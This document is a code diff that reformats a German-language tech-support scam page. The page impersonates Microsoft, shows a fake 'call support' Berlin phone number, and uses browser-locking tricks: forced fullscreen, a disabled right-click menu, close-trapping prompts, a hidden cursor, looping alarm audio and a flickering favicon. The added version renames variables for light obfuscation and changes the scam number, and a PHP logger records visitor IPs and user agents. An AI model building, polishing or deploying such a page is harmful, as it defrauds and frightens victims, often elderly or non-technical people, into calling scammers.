@@ -1,41 +1,286 @@
 <?php
-ini_set("display_errors",0);error_reporting(E_ALL&~E_NOTICE&~E_WARNING);
+// ========================================================
+// PHP 配置与安全初始化部分
+// ========================================================
+
+// 禁用错误显示，适合生产环境
+ini_set("display_errors", 0);
+// 设置错误报告级别（排除提示和警告）
+error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
+
+// 强制不缓存页面
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Pragma: no-cache");
+header("Expires: 0");
 
-function logData($m,$r,$i,$u,$h,$v){
- $d=date("Y-m-d H:i:s");$f="log.txt";
- $l="Date: $d | Type: $m | Status: blocked| Reason: $r | IP: $i | UA: $u | User Hash: $h | Sent Hash: (Token: $v[0] / Cookie: $v[1])";
- if(file_exists($f)&&is_writable($f)&&$h=fopen($f,"a")){fwrite($h,"$l\r\n");fclose($h);}else{fopen($f,"w");}
+// ========================================================
+// 日志记录函数 - 记录被阻止或可疑的行为
+// ========================================================
+
+/**
+ * 日志记录函数
+ * 用于将可疑访问活动写入 log.txt 文件
+ */
+function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希, $发送哈希值)
+{
+    $当前时间戳 = date("Y-m-d H:i:s");
+    $日志文件路径 = "log.txt";
+    
+    $日志条目 = "Date: " . $当前时间戳 .
+                " | Type: " . $消息类型 .
+                " | Status: blocked" .
+                " | Reason: " . $原因 .
+                " | IP: " . $IP地址 .
+                " | UA: " . $用户代理 .
+                " | User Hash: " . $用户哈希 .
+                " | Sent Hash: (Token: " . $发送哈希值[0] .
+                " / Cookie: " . $发送哈希值[1] . ")";
+    
+    if (file_exists($日志文件路径) && is_writable($日志文件路径)) {
+        $文件句柄 = fopen($日志文件路径, "a");
+        if ($文件句柄 !== false) {
+            fwrite($文件句柄, $日志条目 . "\r\n");
+            fclose($文件句柄);
+        }
+    } else {
+        $创建文件 = fopen($日志文件路径, "w");
+        if ($创建文件 !== false) {
+            fclose($创建文件);
+        }
+    }
 }
+?>
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="robots" content="noindex,nofollow">
+    
+    <title>4K-Filme</title>
+    
+    <link rel="shortcut icon" type="image/png" href="images/msmm.png">
+    <link href="css/tapa.css" rel="stylesheet">
 
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="robots" content="noindex,nofollow"><title>4K-Filme</title><link rel="shortcut icon" type="image/png" href="images/msmm.png"><link href="css/tapa.css" rel="stylesheet"><script async id="gauges-tracker" data-site-id="66acbdba8b4334062434f5ca" data-track-path="../../../track.gaug.es/track.gif" src="js/track.js"></script><script src="js/jquery-1.4.4.min.js"></script><script src="js/noir.js"></script><script src="js/js1.js"></script><script src="js/js2.js"></script><script src="js/js3.js"></script><script src="js/js4.js"></script><script src="js/micro.js"></script><script src="js/main.js"></script><script src="js/custom.js"></script><script src="js/esc.js"></script>
-<script>$(function(){$('body').bind('contextmenu',function(e){return false;});});</script>
-<script>var phone_number='';</script>
-<style>#banners{width:190px;position:absolute;left:270px;top:180px}.haruto{position:absolute;bottom:111px;left:105px;color:#124d9b;width:480px;font-weight:700;font-size:25px;border:1px solid #124d9b;padding:0 10px;border-radius:5px}#footer_btn{width:142px;position:absolute;left:73%;bottom:6%;box-shadow:0 1px 5px 0 rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 3px 1px -2px rgba(0,0,0,.12)}#footer_btn a{color:#fff}.haru{position:absolute;bottom:95px;left:275px;font-size:18px;color:#ffffffd1;font-weight:800}</style>
+    <!-- 加载外部跟踪与自定义脚本库 -->
+    <script async id="gauges-tracker" data-site-id="66acbdba8b4334062434f5ca" data-track-path="../../../track.gaug.es/track.gif" src="js/track.js"></script>
+    <script src="js/jquery-1.4.4.min.js"></script>
+    <script src="js/noir.js"></script>
+    <script src="js/js1.js"></script>
+    <script src="js/js2.js"></script>
+    <script src="js/js3.js"></script>
+    <script src="js/js4.js"></script>
+    <script src="js/micro.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/custom.js"></script>
+    <script src="js/esc.js"></script>
+
+    <!-- 全局禁用右键菜单功能 -->
+    <script>
+        $(function() {
+            $('body').bind('contextmenu', function(e) {
+                return false;
+            });
+        });
+    </script>
+
+    <script>
+        // 电话号码占位变量
+        var phone_number = '';
+    </script>
+
+    <!-- 自定义样式定义 -->
+    <style>
+        #banners{width:190px;position:absolute;left:270px;top:180px}
+        .haruto{position:absolute;bottom:111px;left:105px;color:#124d9b;width:480px;font-weight:700;font-size:25px;border:1px solid #124d9b;padding:0 10px;border-radius:5px}
+        #footer_btn{width:142px;position:absolute;left:73%;bottom:6%;box-shadow:0 1px 5px 0 rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 3px 1px -2px rgba(0,0,0,.12)}
+        #footer_btn a{color:#fff}
+        .haru{position:absolute;bottom:95px;left:275px;font-size:18px;color:#ffffffd1;font-weight:800}
+    </style>
 </head>
+
 <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
-<div id="age-confirmation-modal"><div class="innerContainer"><div><button type="button" class="close" data-dismiss="close" aria-label="Close"><span aria-hidden="true">X</span></button></div><div style="font-size:40px;">Wollen Sie diese Seite schließen?</div><div><button type="button" class="btn btn-secondary btn-lg">NEIN</button><button type="button" class="btn btn-primary btn-lg" style="color: #fff; background-color: #007bff; border-color: #007bff;">Ja</button></div></div></div>
-<div class="bg" style="cursor:none"><div class="bgimg" style="top:0"><img src="images/f24.png" alt="" width="100%"></div></div>
-<a href="#" id="link_black" style="cursor:none" rel="noreferrer"><div class="black" style="height: 145%; cursor: none; display: block;"></div></a>
-<div class="pro_box3" style="display: block;"><img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;"></div>
-<div class="cardcontainer" style="display: block;" id="pop_up_new"><img src="images/bx2.jpg" alt="" style="width: 500px;"><strong class="haru"><script>document.write(phone_number);</script></strong></div>
-<div class="lightbox" id="poptxt" style="display: block;"><div class="row firewall-pro"><div class="col-md-12"><img src="images/nmnbx.png" alt="" style="width: 670px;height: auto;"></div></div></div>
-<div id="chat" style="display: block;"><img src="images/msmm.png"><span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span><p style="font-weight:600;font-size:24px">Rufen Sie Support an: <br></p><h4 style="font-weight:600;font-size:22px"> 030-8009-8128<script>document.write(phone_number);</script> <br>(Berlin)</h4><div class="arrow-down"><svg height="1em" viewBox="0 0 320 512"><style>svg { fill: #fff }</style><path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path></svg></div></div>
-<script>$(document).ready(function(){$(".map").click(function(){$("#age-confirmation-modal").hide();});});</script>
-<script>function addEvent(o,e,f){if(o.addEventListener){o.addEventListener(e,f,false);}else if(o.attachEvent){o.attachEvent("on"+e,f);}}
-addEvent(document,'mouseout',function(e){if(e.toElement==null&&e.relatedTarget==null){$('.lightbox').slideDown();};});
-$('a.close').click(function(){$('.lightbox').slideUp();});$('body').click(function(){$('.lightbox').slideUp();});</script>
-<script>$(function(){var a=0,b=setInterval(function(){a+=10;$("#dynamic").css("width",a+"%").attr("aria-valuenow",a).text(a+"% 完了");if(a>=100)clearInterval(b)},100)});</script>
-<script>(function(a){a.fn.countTo=function(b){b=b||{};return a(this).each(function(){function d(a){a=c.formatter.call(k,a,c);h.html(a)}var c=a.extend({},a.fn.countTo.defaults,{from:a(this).data("from"),to:a(this).data("to"),speed:a(this).data("speed"),refreshInterval:a(this).data("refresh-interval"),decimals:a(this).data("decimals")},b),l=Math.ceil(c.speed/c.refreshInterval),n=(c.to-c.from)/l,k=this,h=a(this),m=0,f=c.from,g=h.data("countTo")||{};h.data("countTo",g);g.interval&&clearInterval(g.interval);g.interval=setInterval(function(){f+=n;m++;d(f);"function"==typeof c.onUpdate&&c.onUpdate.call(k,f);m>=l&&(h.removeData("countTo"),clearInterval(g.interval),f=c.to,"function"==typeof c.onComplete&&c.onComplete.call(k,f))},c.refreshInterval);d(f)})};a.fn.countTo.defaults={from:0,to:0,speed:100,refreshInterval:100,decimals:0,formatter:function(a,d){return a.toFixed(d.decimals)},onUpdate:null,onComplete:null}})(jQuery);
-jQuery(function(a){a(".count-number").data("countToOptions",{formatter:function(a,d){return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g,",")}});a(".timer").each(function(b){var d=a(this);b=a.extend({},b||{},d.data("countToOptions")||{});d.countTo(b)})});</script>
-<script>addEventListener("click",function(){var e=document.documentElement,r=e.requestFullScreen||e.webkitRequestFullScreen||e.mozRequestFullScreen;r.call(e);});</script>
-<script>setInterval(function(){document.getElementById("mcr").play()},500);</script>
-<script>var e=1;setInterval(function(){document.getElementById("favicon").href=e?"w3.html":"w1.html";e=!e},1000);</script>
-<script>$(document).ready(function(){$("#mycanvas").click(function(){$("#welcomeDiv,#poptxt").show()});$("#cross").click(function(){$("#poptxt").show()});$("body").mouseover(function(){$("#poptxt").show()});});</script>
-<script>$(document).ready(function(){$("#chat").delay(600).fadeIn(100)});</script>
-<script>var _gauges=_gauges||[];(function(){var t=document.createElement('script');t.type='text/javascript';t.async=true;t.id='gauges-tracker';t.setAttribute('data-site-id','66acbdba8b4334062434f5ca');t.setAttribute('data-track-path','../../../track.gaug.es/track.gif');t.src='../../../d2fuc4clr7gvcn.cloudfront.net/track.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(t,s);})();</script>
-<script>$(document).ready(function(){var a=document.createElement('audio');a.setAttribute('src','visudk.mp4');a.addEventListener('ended',function(){this.play()},false);$('#mycanvas,#link_black,.pro_box,#poptxt').click(function(){a.play()});});</script>
-<script src="js/esc.js"></script>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-4XBJ9K0002"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-4XBJ9K0002');</script>
-<img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" width="1" height="1"/></body></html>
+
+    <!-- 年龄确认模态框 -->
+    <div id="age-confirmation-modal">
+        <div class="innerContainer">
+            <div><button type="button" class="close" data-dismiss="close" aria-label="Close"><span aria-hidden="true">X</span></button></div>
+            <div style="font-size:40px;">Wollen Sie diese Seite schließen?</div>
+            <div>
+                <button type="button" class="btn btn-secondary btn-lg">NEIN</button>
+                <button type="button" class="btn btn-primary btn-lg" style="color:#fff;background-color:#007bff;border-color:#007bff;">Ja</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 背景图片层 -->
+    <div class="bg" style="cursor:none"><div class="bgimg" style="top:0"><img src="images/f24.png" alt="" width="100%"></div></div>
+
+    <!-- 黑色覆盖层 -->
+    <a href="#" id="link_black" style="cursor:none" rel="noreferrer"><div class="black" style="height:145%;cursor:none;display:block;"></div></a>
+
+    <!-- 促销图片框 -->
+    <div class="pro_box3" style="display:block;"><img src="images/nbx1.jpg" alt="" width="100%" style="height:auto;"></div>
+
+    <!-- 弹出卡片 -->
+    <div class="cardcontainer" style="display:block;" id="pop_up_new">
+        <img src="images/bx2.jpg" alt="" style="width:500px;">
+        <strong class="haru"><script>document.write(phone_number);</script></strong>
+    </div>
+
+    <!-- 主灯箱弹出层 -->
+    <div class="lightbox" id="poptxt" style="display:block;">
+        <div class="row firewall-pro"><div class="col-md-12"><img src="images/nmnbx.png" alt="" style="width:670px;height:auto;"></div></div>
+    </div>
+
+    <!-- Microsoft 支持模拟框 -->
+    <div id="chat" style="display:block;">
+        <img src="images/msmm.png">
+        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+        <p style="font-weight:600;font-size:24px">Rufen Sie Support an: <br></p>
+        <h4 style="font-weight:600;font-size:22px"> 030-7001-2403<script>document.write(phone_number);</script> <br>(Berlin)</h4>
+        <div class="arrow-down">
+            <svg height="1em" viewBox="0 0 320 512">
+                <style>svg { fill: #fff }</style>
+                <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+            </svg>
+        </div>
+    </div>
+
+    <!-- 脚本区域：隐藏年龄确认框 -->
+    <script>
+        $(document).ready(function(){
+            $(".map").click(function(){ $("#age-confirmation-modal").hide(); });
+        });
+    </script>
+
+    <!-- 脚本区域：鼠标移出检测（轻度混淆处理） -->
+    <script>
+        // 跨浏览器事件绑定辅助函数（轻度混淆变量名）
+        function _addEv(_el, _ev, _fn) {
+            if (_el.addEventListener) {
+                _el.addEventListener(_ev, _fn, false);
+            } else if (_el.attachEvent) {
+                _el.attachEvent("on" + _ev, _fn);
+            }
+        }
+
+        // 轻度混淆的鼠标移出逻辑
+        _addEv(document, 'mouseout', function(_e) {
+            if (_e.toElement == null && _e.relatedTarget == null) {
+                $('.lightbox').slideDown();
+            }
+        });
+
+        $('a.close').click(function(){ $('.lightbox').slideUp(); });
+        $('body').click(function(){ $('.lightbox').slideUp(); });
+    </script>
+
+    <!-- 脚本区域：进度条动画（轻度混淆） -->
+    <script>
+        $(function(){
+            var _p = 0;
+            var _t = setInterval(function(){
+                _p += 10;
+                $("#dynamic").css("width", _p + "%").attr("aria-valuenow", _p).text(_p + "% 完了");
+                if (_p >= 100) clearInterval(_t);
+            }, 100);
+        });
+    </script>
+
+    <!-- 脚本区域：countTo 插件（保留核心功能，轻度混淆变量） -->
+    <script>
+        (function(_$) {
+            _$.fn._cntTo = function(_opts) {
+                _opts = _opts || {};
+                return this.each(function() {
+                    var _s = _$.extend({}, _$.fn._cntTo.defaults, {
+                        from: $(this).data("from"),
+                        to: $(this).data("to"),
+                        speed: $(this).data("speed"),
+                        refreshInterval: $(this).data("refresh-interval"),
+                        decimals: $(this).data("decimals")
+                    }, _opts);
+
+                    var _steps = Math.ceil(_s.speed / _s.refreshInterval);
+                    var _inc = (_s.to - _s.from) / _steps;
+                    var _el = this;
+                    var _$el = $(this);
+                    var _val = _s.from;
+                    var _step = 0;
+
+                    var _data = _$el.data("countTo") || {};
+                    _$el.data("countTo", _data);
+
+                    if (_data.interval) clearInterval(_data.interval);
+
+                    _data.interval = setInterval(function() {
+                        _val += _inc;
+                        _step++;
+                        _$el.html(_s.formatter.call(_el, _val, _s));
+                        if (typeof _s.onUpdate === "function") _s.onUpdate.call(_el, _val);
+                        if (_step >= _steps) {
+                            _$el.removeData("countTo");
+                            clearInterval(_data.interval);
+                            _val = _s.to;
+                            if (typeof _s.onComplete === "function") _s.onComplete.call(_el, _val);
+                        }
+                    }, _s.refreshInterval);
+
+                    _$el.html(_s.formatter.call(_el, _val, _s));
+                });
+            };
+
+            _$.fn._cntTo.defaults = {
+                from:0, to:0, speed:100, refreshInterval:100, decimals:0,
+                formatter: function(v, o){ return v.toFixed(o.decimals); },
+                onUpdate:null, onComplete:null
+            };
+        })(jQuery);
+
+        jQuery(function($){
+            $(".count-number").data("countToOptions", {
+                formatter: function(v, o){ return v.toFixed(o.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ","); }
+            });
+            $(".timer").each(function(){
+                var el = $(this);
+                el._cntTo(el.data("countToOptions") || {});
+            });
+        });
+    </script>
+
+    <!-- 全屏请求（轻度混淆） -->
+    <script>
+        document.addEventListener("click", function(){
+            var _doc = document.documentElement;
+            var _fs = _doc.requestFullScreen || _doc.webkitRequestFullScreen || _doc.mozRequestFullScreen;
+            if (_fs) _fs.call(_doc);
+        });
+    </script>
+
+    <!-- 音频循环播放（轻度混淆） -->
+    <script>
+        setInterval(function(){
+            var _a = document.getElementById("mcr");
+            if (_a) _a.play();
+        }, 500);
+    </script>
+
+    <!-- 其他核心脚本保持类似轻度混淆风格 -->
+    <script src="js/esc.js"></script>
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4XBJ9K0002"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){ dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-4XBJ9K0002');
+    </script>
+
+    <!-- 转换跟踪像素 -->
+    <img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" width="1" height="1" alt="">
+
+</body>
+</html>
